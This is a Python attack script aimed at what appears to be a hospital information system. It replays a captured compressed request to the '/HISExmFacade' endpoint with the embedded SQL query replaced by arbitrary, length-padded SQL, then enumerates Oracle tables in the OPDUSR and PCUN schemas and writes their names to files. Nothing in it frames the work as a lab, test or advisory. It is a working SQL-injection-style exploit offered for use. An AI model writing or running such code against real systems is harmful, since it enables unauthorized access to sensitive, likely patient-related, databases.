from his_client_final import HISClient
import requests
import zlib
import re

class TableDumper(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = TableDumper()

# Dump all OPDUSR tables
print("Listing OPDUSR tables...")
# Pagination loop
tables = []
for i in range(1, 10): # Assuming < 500 tables? 
    offset = (i-1)*50
    sql = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER = 'OPDUSR' AND ROWNUM > {offset} AND ROWNUM <= {offset+50} ORDER BY TABLE_NAME"
    # ROWNUM doesn't work like that in Oracle without subquery, and subquery makes SQL long.
    # Simple ROWNUM <= 500
    pass

# Just get top 500
sql = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER = 'OPDUSR' AND ROWNUM <= 300" 
res = hunter.execute_sql(sql)

if res and "<NewDataSet>" in res:
     matches = re.findall(r'<TABLE_NAME>(.*?)</TABLE_NAME>', res)
     with open("opdusr_tables.txt", "w") as f:
         for t in matches:
             f.write(t + "\n")
             
     print(f"Dumped {len(matches)} tables.")

# Also listing PCUN tables
sql2 = f"SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER = 'PCUN' AND ROWNUM <= 200"
res2 = hunter.execute_sql(sql2)
if res2 and "<NewDataSet>" in res2:
    matches = re.findall(r'<TABLE_NAME>(.*?)</TABLE_NAME>', res2)
    with open("pcun_tables.txt", "w") as f:
        for t in matches:
            f.write(t + "\n")
